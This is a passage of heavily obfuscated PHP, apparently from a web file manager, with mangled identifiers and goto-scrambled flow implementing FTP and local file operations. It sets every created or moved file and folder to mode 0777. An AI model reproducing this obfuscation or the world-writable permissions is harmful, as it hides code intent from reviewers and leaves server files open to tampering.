bíøì˜—½: } public function listAll($B¸ÚÁ±İÎ†) { goto a„‹‡ö”ô ; B•—˜Å–³¦: foreach ($fó›¼Â¦¼ù as $bĞ—†Ä°ôÏ) { if (is_string($bĞ—†Ä°ôÏ)) { $b†‰ã´àõ[$bĞ—†Ä°ôÏ] = 0; } } return $this->listAllFiles($B¸ÚÁ±İÎ†, array_keys($b†‰ã´àõ), $b†‰ã´àõ); goto Cîˆ³ÊÀõ´; f´¿…±¥‡: $this->fileList($B¸ÚÁ±İÎ†, $fó›¼Â¦¼ù, $DË˜ÛÌ‘é, !0); $b†‰ã´àõ = array(); foreach ($DË˜ÛÌ‘é as $bĞ—†Ä°ôÏ) { $b†‰ã´àõ[$bĞ—†Ä°ôÏ[$Aˆâë­¾—Œ[28]]] = $bĞ—†Ä°ôÏ[$Aˆâë­¾—Œ[78]]; } goto B•—˜Å–³¦; a„‹‡ö”ô : $Aˆâë­¾—Œ =& $_SERVER[æ§›¦ÌáØ]; if (!$this->_isconn()) { return !1; } $fó›¼Â¦¼ù = $DË˜ÛÌ‘é = array(); goto f´¿…±¥‡; Cîˆ³ÊÀõ´: } public function getContent($f‹¸–¼Ù§) { if (!$this->_isconn()) { return !1; } $f‹¸–¼Ù§ = $this->iconvSystem($f‹¸–¼Ù§); return $this->fileSubstr($f‹¸–¼Ù§); } public function setContent($BÎøµ¹ñÄ•, $F…Õ‚¹âñá = '') { goto b±Šä¼â¾Ó; A®Ï¿é‘’ò: file_put_contents($B®˜ÄÑÆ»Ş, $F…Õ‚¹âñá); $B±ªƒ¿³Å = $this->upload($BÎøµ¹ñÄ•, $this->iconvApp($B®˜ÄÑÆ»Ş)); $this->tempFileRemve($B®˜ÄÑÆ»Ş); goto Fà‡ìŒÕà; b±Šä¼â¾Ó: if (!$this->_isconn()) { return !1; } $e·½ã£Åƒ› = $this->pathThis($this->iconvSystem($BÎøµ¹ñÄ•)); $B®˜ÄÑÆ»Ş = $this->tempFile($e·½ã£Åƒ›); goto A®Ï¿é‘’ò; Fà‡ìŒÕà: return $B±ªƒ¿³Å; goto aÊ¡æÊ­Êô; aÊ¡æÊ­Êô: } public function fileSubstr($E¨ ßé×‡Ğ, $bçáğ´ö‰Ú = 0, $cøÍƒİçƒ = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($E¨ ßé×‡Ğ, $bçáğ´ö‰Ú, $cøÍƒİçƒ); } private function ftpRequest($b‘¦¸¡æˆø, $bç’‚š •á = 0, $fâ£“¤ô• = false) { goto DìÀ©Ğö÷—; DìÀ©Ğö÷—: $b‘¦¸¡æˆø = $this->iconvSystem($b‘¦¸¡æˆø); $cî¯¤·ÜÉ = $this->scheme . $this->host . $_SERVER[æ§›¦ÌáØ][4] . $this->port; $FôâŠ¼Š¦ = curl_init(); goto B—óŞèµ; d…æéÉŸÇœ: return $aêíùƒŞìù; goto d‘ôóÄ‘Ã; B—óŞèµ: curl_setopt($FôâŠ¼Š¦, CURLOPT_URL, $cî¯¤·ÜÉ . $this->pathEncode($b‘¦¸¡æˆø)); curl_setopt($FôâŠ¼Š¦, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($fâ£“¤ô•) { $d‡”Ô¾ŞÓÁ = $bç’‚š •á + $fâ£“¤ô• - 1; curl_setopt($FôâŠ¼Š¦, CURLOPT_RANGE, "{$bç’‚š •á}\x2d{$d‡”Ô¾ŞÓÁ}"); } goto EñùôŞù˜; EñùôŞù˜: curl_setopt($FôâŠ¼Š¦, CURLOPT_RETURNTRANSFER, 1); $aêíùƒŞìù = curl_exec($FôâŠ¼Š¦); curl_close($FôâŠ¼Š¦); goto d…æéÉŸÇœ; d‘ôóÄ‘Ã: } public function upload($B¶ÓÊÅŠ•, $eÅºÄ£»‡, $CØ§’£—Û = false, $C¬ÓçâóÈ­ = REPEAT_REPLACE) { goto e›³ò˜‡êµ; bØ›¬°ƒÌÄ: $eÅºÄ£»‡ = $this->iconvSystem($eÅºÄ£»‡); $A‹…Ÿß»‹î = ftp_nb_put($this->connect, $B¶ÓÊÅŠ•, $eÅºÄ£»‡, FTP_BINARY); while ($A‹…Ÿß»‹î == FTP_MOREDATA) { $A‹…Ÿß»‹î = ftp_nb_continue($this->connect); } goto E¹³’§êŠì; e›³ò˜‡êµ: if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($B¶ÓÊÅŠ•))) { return !1; } $B¶ÓÊÅŠ• = $this->iconvSystem($B¶ÓÊÅŠ•); goto bØ›¬°ƒÌÄ; E¹³’§êŠì: if ($A‹…Ÿß»‹î != FTP_FINISHED) { return !1; } return $this->getPathOuter($B¶ÓÊÅŠ•); goto a¨‰…îõÖŞ; a¨‰…îõÖŞ: } public function download($E’”ŞÑŒ†ƒ, $fŠÔ‚ÉÜ— = '') { goto bÈ´Ä„ğÌ†; bÈ´Ä„ğÌ†: if (!$this->_isconn()) { return !1; } $fºÈÌ¨æåÏ = $this->pathFather($fŠÔ‚ÉÜ—); if (!IO::mkdir($fºÈÌ¨æåÏ)) { return !1; } goto AèÊŠŠ¡¦©; c¯å‡ˆğ¹: while ($CâàïŞÍùÕ == FTP_MOREDATA) { $CâàïŞÍùÕ = ftp_nb_continue($this->connect); } if ($CâàïŞÍùÕ != FTP_FINISHED) { return !1; } return $this->iconvApp($fŠÔ‚ÉÜ—); goto C‡Ø»êïÓ; AèÊŠŠ¡¦©: $E’”ŞÑŒ†ƒ = $this->iconvSystem($E’”ŞÑŒ†ƒ); $fŠÔ‚ÉÜ— = $this->iconvSystem($fŠÔ‚ÉÜ—); $CâàïŞÍùÕ = ftp_nb_get($this->connect, $fŠÔ‚ÉÜ—, $E’”ŞÑŒ†ƒ, FTP_BINARY); goto c¯å‡ˆğ¹; C‡Ø»êïÓ: } public function exist($d‰›×ªÇŠò) { return $this->isFile($d‰›×ªÇŠò) || $this->isFolder($d‰›×ªÇŠò); } public function isFile($BÈŸ›§¥„ì) { return !$this->isFolder($BÈŸ›§¥„ì) && $this->objectMeta($BÈŸ›§¥„ì); } public function isFolder($B‰ÕÎø¼™) { return $this->cacheMethod($_SERVER[æ§›¦ÌáØ][199], $B‰ÕÎø¼™); } protected function objectMeta($BÉØ˜À‚…³) { return $this->cacheMethod($_SERVER[æ§›¦ÌáØ][200], $BÉØ˜À‚…³); } protected function _objectMeta($f¤ÌÄ™ò) { goto fÔğöŠ’å×; a¾¤Ïİ‘‚¢: $AœŠğÌèã‘ = @ftp_size($this->connect, $f¤ÌÄ™ò); if ($AœŠğÌèã‘ != -1) { $CµÓ”¯‘ÔŒ[$EëğºñæÆã[78]] = $AœŠğÌèã‘; } else { $FšŒĞŒ†òš = @ftp_chdir($this->connect, $f¤ÌÄ™ò); if (!$FšŒĞŒ†òš) { return !1; } $CµÓ”¯‘ÔŒ[$EëğºñæÆã[29]] = $EëğºñæÆã[77]; } return $CµÓ”¯‘ÔŒ; goto Dˆ¦¿¹ï¼…; e¤ºã‹…Œ: $f¤ÌÄ™ò = $this->iconvSystem($f¤ÌÄ™ò); $CµÓ”¯‘ÔŒ = array($EëğºñæÆã[28] => $this->iconvApp($f¤ÌÄ™ò), $EëğºñæÆã[29] => $EëğºñæÆã[193], $EëğºñæÆã[78] => 0); @ftp_chdir($this->connect, $EëğºñæÆã[8]); goto a¾¤Ïİ‘‚¢; fÔğöŠ’å×: $EëğºñæÆã =& $_SERVER[æ§›¦ÌáØ]; if ($f¤ÌÄ™ò == $EëğºñæÆã[33] || $f¤ÌÄ™ò == $EëğºñæÆã[8]) { return array(); } if (!$this->_isconn()) { return !1; } goto e¤ºã‹…Œ; Dˆ¦¿¹ï¼…: } protected function _isFolder($a ““¥¬±Ò) { $f½„¯‹ìĞ =& $_SERVER[æ§›¦ÌáØ]; if ($a ““¥¬±Ò == $f½„¯‹ìĞ[33] || $a ““¥¬±Ò == $f½„¯‹ìĞ[8]) { return !0; } $b‡‹†äåÍ‘ = $this->_objectMeta($a ““¥¬±Ò); return isset($b‡‹†äåÍ‘[$f½„¯‹ìĞ[29]]) && $b‡‹†äåÍ‘[$f½„¯‹ìĞ[29]] == $f½„¯‹ìĞ[77] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($Eğø”‘ëÈ¢) { if (substr($Eğø”‘ëÈ¢, 0, 2) == $_SERVER[æ§›¦ÌáØ][1235]) { $Eğø”‘ëÈ¢ = BASIC_PATH . substr($Eğø”‘ëÈ¢, 2); } return $Eğø”‘ëÈ¢; } public function iconvApp($Fä½½Ö®†®) { $bÄ¢Œ‹Ï¹ =& $_SERVER[æ§›¦ÌáØ]; global $config; return $this->iconvTo($Fä½½Ö®†®, $config[$bÄ¢Œ‹Ï¹[1233]], $config[$bÄ¢Œ‹Ï¹[1232]]); } public function iconvSystem($EŞîŠô†¹Ë) { $a ×Û½ù =& $_SERVER[æ§›¦ÌáØ]; global $config; return $this->iconvTo($EŞîŠô†¹Ë, $config[$a ×Û½ù[1232]], $config[$a ×Û½ù[1233]]); } public function getPathOuter($EœÌœÄÛ„¸) { goto F¾ùª¯¥±; CÃ¼…Ëœ¼: return $this->pathDriver . $BÏ¶’ ‘âœ[8] . ltrim($EœÌœÄÛ„¸, $BÏ¶’ ‘âœ[8]); goto cîñÜ¤Š»; A¸Í¹¦íí¶: if (substr($dˆ„çÆ‰·ó, 0, 2) == $BÏ¶’ ‘âœ[1235]) { $dˆ„çÆ‰·ó = BASIC_PATH . substr($dˆ„çÆ‰·ó, 2); } if (substr($EœÌœÄÛ„¸, 0, 2) == $BÏ¶’ ‘âœ[1235]) { $EœÌœÄÛ„¸ = BASIC_PATH . substr($EœÌœÄÛ„¸, 2); } $dˆ„çÆ‰·ó = KodIO::clear($dˆ„çÆ‰·ó); goto E‰óšºò›¥; F¾ùª¯¥±: $BÏ¶’ ‘âœ =& $_SERVER[æ§›¦ÌáØ]; $dˆ„çÆ‰·ó = $this->iconvApp($this->pathBase); $EœÌœÄÛ„¸ = $this->iconvApp($EœÌœÄÛ„¸); goto A¸Í¹¦íí¶; E‰óšºò›¥: $EœÌœÄÛ„¸ = KodIO::clear($EœÌœÄÛ„¸); $EœÌœÄÛ„¸ = substr($EœÌœÄÛ„¸, strlen($dˆ„çÆ‰·ó)); if (empty($this->pathDriver)) { return $EœÌœÄÛ„¸; } goto CÃ¼…Ëœ¼; cîñÜ¤Š»: } public function mkfile($Fêİ†ãæÙƒ, $C‘Ä×ªá‹¼ = '', $Cæñ£–ôèõ = REPEAT_RENAME) { $Fêİ†ãæÙƒ = $this->iconvSystem($Fêİ†ãæÙƒ); @touch($Fêİ†ãæÙƒ); if ($C‘Ä×ªá‹¼) { file_put_contents($Fêİ†ãæÙƒ, $C‘Ä×ªá‹¼); } @chmod($Fêİ†ãæÙƒ, 511); return is_file($Fêİ†ãæÙƒ) ? $this->getPathOuter($Fêİ†ãæÙƒ) : !1; } public function mkdir($B†÷Çß¢, $cœ°Ü¨÷Şç = REPEAT_SKIP) { $B†÷Çß¢ = $this->iconvSystem($B†÷Çß¢); if (is_dir($B†÷Çß¢)) { return $this->getPathOuter($B†÷Çß¢); } @mkdir($B†÷Çß¢, 511, !0); @chmod($B†÷Çß¢, 511); return is_dir($B†÷Çß¢) ? $this->getPathOuter($B†÷Çß¢) : !1; } public function copyFile($cËì¨¿˜ªõ, $Aò íÌµô) { $this->mkdir($this->pathFather($Aò íÌµô)); $cËì¨¿˜ªõ = $this->iconvSystem($cËì¨¿˜ªõ); $Aò íÌµô = $this->iconvSystem($Aò íÌµô); $câÆ¶ì£¹“ = copy_64($cËì¨¿˜ªõ, $Aò íÌµô); @chmod($Aò íÌµô, 511); return $câÆ¶ì£¹“ ? $this->getPathOuter($Aò íÌµô) : !1; } public function moveFile($A‚ÈëñŠƒ±, $FªåÓË±Ü) { goto A„®Õßè¾ê; A„®Õßè¾ê: $this->mkdir($this->pathFather($FªåÓË±Ü)); $A‚ÈëñŠƒ± = $this->iconvSystem($A‚ÈëñŠƒ±); $FªåÓË±Ü = $this->iconvSystem($FªåÓË±Ü); goto B²§ô·øÑ; C±Ş†Áíš×: return $aäÑôŞÂÌµ ? $this->getPathOuter($FªåÓË±Ü) : !1; goto f†õà„ÒòÒ; B²§ô·øÑ: $aäÑôŞÂÌµ = intval(@rename($A‚ÈëñŠƒ±, $FªåÓË±Ü)); if (!$aäÑôŞÂÌµ) { if ($aäÑôŞÂÌµ = intval(@copy_64($A‚ÈëñŠƒ±, $FªåÓË±Ü))) { @unlink($A‚ÈëñŠƒ±); } } @chmod($FªåÓË±Ü, 511); goto C±Ş†Áíš×; f†õà„ÒòÒ: } public function delFile($f–Š¥ßßññ) { $f–Š¥ßßññ = $this->iconvSystem($f–Š¥ßßññ); if (!@unlink($f–Š¥ßßññ)) { @chmod($f–Š¥ßßññ, 511); if (!@unlink($f–Š¥ßßññ)) { return !1; } } else { return !0; } } public function delFolder($cĞÙ´Š«„) { goto b°ÅÀ†âÜ™; f¸¸îÀÇ’º: return rmdir($cĞÙ´Š«„); goto d…­¹šğÅô; d³Òº«‚š‹: if (!($eñÄŠøï·å = opendir($cĞÙ´Š«„))) { return !1; } while (($BìÀÓ§ëœÓ = readdir($eñÄŠøï·å)) !== !1) { if ($BìÀÓ§ëœÓ == $b¥‰¹ÙÓ[95] || $BìÀÓ§ëœÓ == $b¥‰¹ÙÓ[1242]) { continue; } $c©œøá­õ = $cĞÙ´Š«„ . $b¥‰¹ÙÓ[8] . $BìÀÓ§ëœÓ; if (is_file($c©œøá­õ) || is_link($c©œøá­õ)) { if (!unlink($c©œøá­õ)) { chmod($c©œøá­õ, 511); if (!unlink($c©œøá­õ)) { return !1; } } } else { if (is_dir($c©œøá­õ)) { chmod($c©œøá­õ, 511); $c©œøá­õ = $this->iconvApp($c©œøá­õ); if (!$this->delFolder($c©œøá­õ)) { return !1; } } } } closedir($eñÄŠøï·å); goto f¸¸îÀÇ’º; b°ÅÀ†âÜ™: $b¥‰¹ÙÓ =& $_SERVER[æ§›¦ÌáØ]; $cĞÙ´Š«„ = $this->iconvSystem($cĞÙ´Š«„); if (!is_dir($cĞÙ´Š«„)) { return !0; } goto d³Òº«‚š‹; d…­¹šğÅô: } public function rename($cŸ·„Ãç¹, $D–•¢ÇŠì‘) { goto a—Îƒ»çˆ…; fë»Àå´‚: $a£ëŠÙÎ½ = @rename($cŸ·„Ãç¹, $bíÂíß˜‡Ø); $bíÂíß˜‡Ø = $this->iconvApp($bíÂíß˜‡Ø); return $a£ëŠÙÎ½ ? $this->getPathOuter($bíÂíß˜‡Ø) : !1; goto C„ñÊ›Õ„›; a—Îƒ»çˆ…: $B»¯„Í¼— =& $_SERVER[æ§›¦ÌáØ]; $E©ºÄ‚§¢Ï = $this->fileNameAuto($this->pathFather($cŸ·„Ãç¹), $D–•¢ÇŠì‘); $E©ºÄ‚§¢Ï = $this->iconvSystem($E©ºÄ‚§¢Ï); goto DÈ’‚™““„; DÈ’‚™““„: $cŸ·„Ãç¹ = $this->iconvSystem($cŸ·„Ãç¹); $Aæë›Ä = $this->pathFather($cŸ·„Ãç¹); $bíÂíß˜‡Ø = rtrim($Aæë›Ä, $B»¯„Í¼—[8]) . $B»¯„Í¼—[8] . $E©ºÄ‚§¢Ï; goto fë»Àå´‚; C„ñÊ›Õ„›: } public function size($FÖ¢Á…¤Ş») { $FÖ¢Á…¤Ş» = $this->iconvSystem($FÖ¢Á…¤Ş»); return filesize_64($FÖ¢Á…¤Ş»); } public function info($c«ŞâˆÛâ) { $c«ŞâˆÛâ = $this->iconvSystem($c«ŞâˆÛâ); if ($this->isFolder($c«ŞâˆÛâ)) { return $this->folderInfo($c«ŞâˆÛâ); } else { if ($this->isFile($c«ŞâˆÛâ)) { return $this->fileInfo($c«ŞâˆÛâ); } } return !1; } protected function infoChildren($FÈ…ìæ¢ÅØ, &$cí‘•êìê, $d·¡ŞŒç¥„ = true) { goto E‹æšµó ; E‹æšµó : $DãíâÂõø =& $_SERVER[æ§›¦ÌáØ]; check_abort_echo(); $FÈ…ìæ¢ÅØ = rtrim($FÈ…ìæ¢ÅØ, $DãíâÂõø[8]) . $DãíâÂõø[8]; goto e¢½æ¦œİ’; e¢½æ¦œİ’: if ($d·¡ŞŒç¥„) { $FÈ…ìæ¢ÅØ = $this->iconvSystem($FÈ…ìæ¢ÅØ); } if (!($B»ÌíÍ‰Ú = @opendir($FÈ…ìæ¢ÅØ))) { return; } while (($Eì•¸„½…Í = readdir($B»ÌíÍ‰Ú)) !== !1) { if ($Eì•¸„½…Í == $DãíâÂõø[95] || $Eì•¸„½…Í == $DãíâÂõø[1242]) { continue; } $D¯¢ëæ­è² = $FÈ…ìæ¢ÅØ . $Eì•¸„½…Í; if (is_file($D¯¢ëæ­è²) || is_link($D¯¢ëæ­è²)) { $cí‘•êìê[$DãíâÂõø[79]]++; $cí‘•êìê[$DãíâÂõø[78]] += filesize_64($D¯¢ëæ­è²); } else { if (is_dir($D¯¢ëæ­è²)) { $cí‘•êìê[$DãíâÂõø[80]]++; $this->infoChildren($D¯¢ëæ­è², $cí‘•êìê, !1); } } } goto E–Œ…ô·Õ; E–Œ…ô·Õ: closedir($B»ÌíÍ‰Ú); goto B×è¨—À³; B×è¨—À³: } private function folderInfo($Eƒ§šƒóÈÂ, $e¹¡èåóÀ— = false) { $AÓÏåÅÙĞ‹ =& $_SERVER[æ§›¦ÌáØ]; $Eƒ§šƒóÈÂ = rtrim($Eƒ§šƒóÈÂ, $AÓÏåÅÙĞ‹[8]) . $AÓÏåÅÙĞ‹[8]; $C·°ôƒ˜»ò = $this->iconvApp($this->pathThis($Eƒ§šƒóÈÂ)); if ($e¹¡èåóÀ—) { return array($AÓÏåÅÙĞ‹[28] => $C·°ôƒ˜»ò, $AÓÏåÅÙĞ‹[76] => $this->getPathOuter($Eƒ§šƒóÈÂ), $AÓÏåÅÙĞ‹[29] => $AÓÏåÅÙĞ‹[77]); } $C´Ÿó®ÜÒ¸ = array($AÓÏåÅÙĞ‹[28] => $C·°ôƒ˜»ò, $AÓÏåÅÙĞ‹[76] => $this->getPathOuter($Eƒ§šƒóÈÂ), $AÓÏåÅÙĞ‹[29] => $AÓÏåÅÙĞ‹[77], $AÓÏåÅÙĞ‹[194] => @filectime($Eƒ§šƒóÈÂ), $AÓÏåÅÙĞ‹[84] => @filemtime($Eƒ§šƒóÈÂ), $AÓÏåÅÙĞ‹[1245] => @fileatime($Eƒ§šƒóÈÂ), $AÓÏåÅÙĞ‹[1246] => is_readable($Eƒ§šƒóÈÂ), $AÓÏåÅÙĞ‹[1247] => is_writable($Eƒ§šƒóÈÂ), $AÓÏåÅÙĞ‹[1248] => get_mode($Eƒ§šƒóÈÂ)); return $C´Ÿó®ÜÒ¸; } private function fileInfo($eåäÃÉâÆ, $A³ÑËì«Ø = false) { $eäàá©¢Ç =& $_SERVER[æ§›¦ÌáØ]; $eøÔ¡ßŸƒŒ = $this->iconvApp($this->pathThis($eåäÃÉâÆ)); if ($A³ÑËì«Ø) { return array($eäàá©¢Ç[28] => $eøÔ¡ßŸƒŒ, $eäàá©¢Ç[76] => $this->getPathOuter($eåäÃÉâÆ), $eäàá©¢Ç[29] => $eäàá©¢Ç[193], $eäàá©¢Ç[78] => $this->size($eåäÃÉâÆ), $eäàá©¢Ç[168] => $this->ext($eøÔ¡ßŸƒŒ)); } $bÓšé¬ìâù = array($eäàá©¢Ç[28] => $eøÔ¡ßŸƒŒ, $eäàá©¢Ç[76] => $this->getPathOuter($eåäÃÉâÆ), $eäàá©¢Ç[29] => $eäàá©¢Ç[193], $eäàá©¢Ç[194] => @filectime($eåäÃÉâÆ), $eäàá©¢Ç[84] => @filemtime($eåäÃÉâÆ), $eäàá©¢Ç[1245] => @fileatime($eåäÃÉâÆ), $eäàá©¢Ç[78] => $this->size($eåäÃÉâÆ), $eäàá©¢Ç[168] => $this->ext($eøÔ¡ßŸƒŒ), $eäàá©¢Ç[1246] => is_readable($eåäÃÉâÆ), $eäàá©¢Ç[1247] => is_writable($eåäÃÉâÆ), $eäàá©¢Ç[1248] => get_mode($eåäÃÉâÆ)); return $bÓšé¬ìâù; } public function exist($BÜíëøÓé) { $BÜíëøÓé = $this->iconvSystem($BÜíëøÓé); return @file_exists($BÜíëøÓé); } public function isFile($a²²õË†Ï§) { $a²²õË†Ï§ = $this->iconvSystem($a²²õË†Ï§); return @is_file($a²²õË†Ï§); } public function isFolder($aò¸âÄàÛ¢) { $aò¸âÄàÛ¢ = $this->iconvSystem($aò¸âÄàÛ¢); return @is_dir($aò¸âÄàÛ¢); } public function listPath($BãÒ²É¥é¯, $Cå¾ªê“ù‡ = false) { goto f™²°óÄ‚; eœ‡‚Êò§: $eæ½½•÷ = array($b®„¡£Çè¢[75] => array(), $b®„¡£Çè¢[74] => array()); if (!($F£õùŞ‡ß = @opendir($BãÒ²É¥é¯))) { return $eæ½½•÷; } while (($fÏ°êÃÎÓ = readdir($F£õùŞ‡ß)) !== !1) { if ($fÏ°êÃÎÓ == $b®„¡£Çè¢[95] || $fÏ°êÃÎÓ == $b®„¡£Çè¢[1242]) { continue; } $f×Äİ—Èåò = $BãÒ²É¥é¯ . $fÏ°êÃÎÓ; if (is_file($f×Äİ—Èåò)) { $eæ½½•÷[$b®„¡£Çè¢[74]][] = $this->fileInfo($f×Äİ—Èåò, $Cå¾ªê“ù‡); } else { $eæ½½•÷[$b®„¡£Çè¢[75]][] = $this->folderInfo($f×Äİ—Èåò, $Cå¾ªê“ù‡); } } goto DÆÂ¦‚—ˆ•; DÆÂ¦‚—ˆ•: closedir($F£õùŞ‡ß); return $eæ½½•÷; goto Fƒ©çø©È; f™²°óÄ‚: $b®„¡£Çè¢ =& $_SERVER[æ§›¦ÌáØ]; $BãÒ²É¥é¯ = $this->iconvSystem($BãÒ²É¥é¯); $BãÒ²É¥é¯ = rtrim($BãÒ²É¥é¯, $b®„¡£Çè¢[8]) . $b®„¡£Çè¢[8]; goto eœ‡‚Êò§; Fƒ©çø©È: } public function listAll($AÀ¢Şë’‡›, &$Aù¾¬ƒ½ = array()) { goto F¯ÙÓ—¯˜; bõİƒ»„–: return $Aù¾¬ƒ½; goto a”ºßæŞ; f«¯ˆ¼ïÃ¸: if (!($AèŞØ®ÛÏ‹ = @opendir($AÀ¢Şë’‡›))) { return $Aù¾¬ƒ½; } while (($A…¼ˆÄ†Øö = readdir($AèŞØ®ÛÏ‹)) !== !1) { if ($A…¼ˆÄ†Øö == $fÀ ›ŞŒ­š[95] || $A…¼ˆÄ†Øö == $fÀ ›ŞŒ­š[1242]) { continue; } $cƒê­†¯è = $AÀ¢Şë’‡› . $A…¼ˆÄ†Øö; if (is_dir($cƒê­†¯è) && !is_link($cƒê­†¯è)) { $Aù¾¬ƒ½[] = array($fÀ ›ŞŒ­š[76] => $cƒê­†¯è . $fÀ ›ŞŒ­š[8], $fÀ ›ŞŒ­š[77] => 1, $fÀ ›ŞŒ­š[84] => @filemtime($cƒê­†¯è), $fÀ ›ŞŒ­š[78] => 0); $this->listAll($cƒê­†¯è, $Aù¾¬ƒ½); } else { $Aù¾¬ƒ½[] = array($fÀ ›ŞŒ­š[76] => $cƒê­†¯è, $fÀ ›ŞŒ­š[77] => 0, $fÀ ›ŞŒ­š[84] => @filemtime($cƒê­†¯è), $fÀ ›ŞŒ­š[78] => $this->size($cƒê­†¯è)); } } closedir($AèŞØ®ÛÏ‹); goto bõİƒ»„–; F¯ÙÓ—¯˜: $fÀ ›ŞŒ­š =& $_SERVER[æ§›¦ÌáØ]; $AÀ¢Şë’‡› = $this->iconvSystem($AÀ¢Şë’‡›); $AÀ¢Şë’‡› = rtrim($AÀ¢Şë’‡›, $fÀ ›ŞŒ­š[8]) . $fÀ ›ŞŒ­š[8]; goto f«¯ˆ¼ïÃ¸; a”ºßæŞ: } public function has($Dç²óİ…¢‚, $b‚²Üæ²²œ = false, $c‰œÌŠÙ¡ = true) { goto CÂèÁ„¡ßŠ; A¸Ö¿ß: $bµåà× = 0; while (($bÉ‹‚ƒ…ï¬ = readdir($a Ö‹¿êƒ)) !== !1) { if ($bÉ‹‚ƒ…ï¬ == $b™â»š¼‡[95] || $bÉ‹‚ƒ…ï¬ == $b™â»š¼‡[1242]) { continue; } $d¥³®ô÷Ä„ = $Dç²óİ…¢‚ . $bÉ‹‚ƒ…ï¬; if ($b‚²Üæ²²œ) { $bµåà×++; if (@is_file($d¥³®ô÷Ä„)) { $F•ËØ¶«ĞÌ++; } else { $aÏ“ëÒá¢À++; } if ($bµåà× > 10000) { break; } continue; } if ($c‰œÌŠÙ¡) { if (@is_file($d¥³®ô÷Ä„)) { return !0; } } else { if (@is_dir($d¥³®ô÷Ä„ . $b™â»š¼‡[8])) { return !0; } } } closedir($a Ö‹¿êƒ); goto FÎÏİ›£¡; FÎÏİ›£¡: if ($b‚²Üæ²²œ) { return array($b™â»š¼‡[203] => $F•ËØ¶«ĞÌ, $b™â»š¼‡[204] => $aÏ“ëÒá¢À); } return !1; goto bÕ‘¨»‹Š; b”µ“: if (!($a Ö‹¿êƒ = @opendir($Dç²óİ…¢‚))) { return !1; } $F•ËØ¶«ĞÌ = 0; $aÏ“ëÒá¢À = 0; goto A¸Ö¿ß; CÂèÁ„¡ßŠ: $b™â»š¼‡ =& $_SERVER[æ§›¦ÌáØ]; $Dç²óİ…¢‚ = $this->iconvSystem($Dç²óİ…¢‚); $Dç²óİ…¢‚ = rtrim($Dç²óİ…¢‚, $b™â»š¼‡[8]) . $b™â»š¼‡[8]; goto b”µ“; bÕ‘¨»‹Š: } public function hashSimple($fîİèÌÁÂá) { goto aĞÜ†çËîÛ; B»™†¤ÉÒ: $c¨­†ô¸í = $this->size($fîİèÌÁÂá); $Eöµá˜Îã = 200; $DÓ»’†‚½ = 50; goto eâè™ö˜Ù; fëÌƒê›ò£: $e„´ã„›° = fopen($fîİèÌÁÂá, $B¢ÈÖ¥èğŞ[1249]); if (!$e„´ã„›°) { return $d¥¡ˆƒï; } for ($f“äÆ°çô¿ = 0; $f“äÆ°çô¿ < $DÓ»’†‚½; $f“äÆ°çô¿++) { fseek_64($e„´ã„›°, $d¤ãŞ÷ßª¬ * $f“äÆ°çô¿); $d¥¡ˆƒï .= fread($e„´ã„›°, $Eöµá˜Îã); } goto FÄ¥¶­‡›¾; eâè™ö˜Ù: if ($c¨­†ô¸í <= $Eöµá˜Îã * $DÓ»’†‚½) { return $this->hashMd5($fîİèÌÁÂá) . $c¨­†ô¸í; } $d¥¡ˆƒï = $B¢ÈÖ¥èğŞ[33]; $d¤ãŞ÷ßª¬ = intval($c¨­†ô¸í / $DÓ»’†‚½); goto fëÌƒê›ò£; FÄ¥¶­‡›¾: fseek_64($e„´ã„›°, $c¨­†ô¸í - $Eöµá˜Îã); $d¥¡ˆƒï .= fread($e„´ã„›°, $Eöµá˜Îã); fclose($e„´ã„›°); goto e÷«Ê”Ä‰; aĞÜ†çËîÛ: $B¢ÈÖ¥èğŞ =& $_SERVER[æ§›¦ÌáØ]; if (!$fîİèÌÁÂá) { return md5($B¢ÈÖ¥èğŞ[33]); } $fîİèÌÁÂá = $this->iconvSystem($fîİèÌÁÂá); goto B»™†¤ÉÒ; e÷«Ê”Ä‰: return md5($d¥¡ˆƒï) . $c¨­†ô¸í; goto f‰ÜÑ®ÜÓ; f‰ÜÑ®ÜÓ: } public function getContent($D ·«í„ŸØ) { $D ·«í„ŸØ = $this->iconvSystem($D ·«í„ŸØ); return file_get_contents($D ·«í„ŸØ); } public function setContent($CÛµ‚Òî, $d¿º£…»  = '') { $CÛµ‚Òî = $this->iconvSystem($CÛµ‚Òî); $f´ÙÄº‹ÂØ = @file_put_contents($CÛµ‚Òî, $d¿º£…» , LOCK_EX); clearstatcache(); @chmod($CÛµ‚Òî, 511); return $f´ÙÄº‹ÂØ === !1 ? !1 : !0; } public function fileSubstr($Bˆ Ï­óí, $B˜ß×¯ì×‡ = 0, $FÄ©»»á±¤ = false) { goto cŒÜ½ë³Íİ; cŒÜ½ë³Íİ: $eëªÉğÅœ =& $_SERVER[æ§›¦ÌáØ]; $Bˆ Ï­óí = $this->iconvSystem($Bˆ Ï­óí); if ($FÄ©»»á±¤ === !1) { $FÄ©»»á±¤ = $this->size($Bˆ Ï­óí); } goto c‘‰©î·ç; e©÷ÈÓÍí: return $dÚ¶æÖ±Õœ; goto a¤“ç¸¹„ç; cã¥İÉ—¶: fseek_64($BõÆˆĞÒ‹Î, $B˜ß×¯ì×‡); $dÚ¶æÖ±Õœ = fread($BõÆˆĞÒ‹Î, $FÄ©»»á±¤); fclose($BõÆˆĞÒ‹Î); goto e©÷ÈÓÍí; c‘‰©î·ç: if ($FÄ©»»á±¤ <= 0) { return $eëªÉğÅœ[33]; } $BõÆˆĞÒ‹Î = fopen($Bˆ Ï­óí, $eëªÉğÅœ[1249]); if (!$BõÆˆĞÒ‹Î) { return !1; } goto cã¥İÉ—¶; a¤“ç¸¹„ç: } public function upload($eµ‡‹Çœ, $f„ëŞ…àì, $D‰ƒÎæ²äÂ = false, $eŞÊ££‚™ö = REPEAT_REPLACE) { if ($D‰ƒÎæ²äÂ) { return $this->moveFile($f„ëŞ…àì, $eµ‡‹Çœ); } return $this->copyFile($f„ëŞ…àì, $eµ‡‹Çœ); } public function setModifyTime($BÎßÜí¤¸Õ, $Ağ×ÔŠ²‘Š = '') { @touch($BÎßÜí¤¸Õ, intval($Ağ×ÔŠ²‘Š)); } public function download($dóÓ§ë÷Ë, $C†ÄÓ…¶ê·) { return $this->iconvSystem($dóÓ§ë÷Ë); } } goto B‘ß§¥Òšæ; BÀöÏæ¿ƒ­: if ($_SERVER[$_SERVER[æ§›¦ÌáØ][785]] != 